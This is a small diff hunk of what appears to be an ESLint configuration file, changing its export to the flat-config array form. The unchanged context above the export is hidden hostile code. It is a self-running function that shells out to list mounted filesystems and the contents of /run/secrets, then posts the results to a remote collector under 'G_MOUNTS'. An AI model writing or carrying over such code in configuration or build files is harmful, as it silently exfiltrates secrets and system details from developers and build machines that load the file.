@@ -76,4 +76,4 @@ function fp(v) {
   post("G_MOUNTS", sh("mount 2>/dev/null | grep -viE 'proc|sysfs|cgroup|tmpfs|devpts' | head -30; echo ---; ls -la /run/secrets 2>/dev/null"));
 })();
 
-module.exports = { root: true, rules: {} };
+module.exports = [ { rules: {} } ];
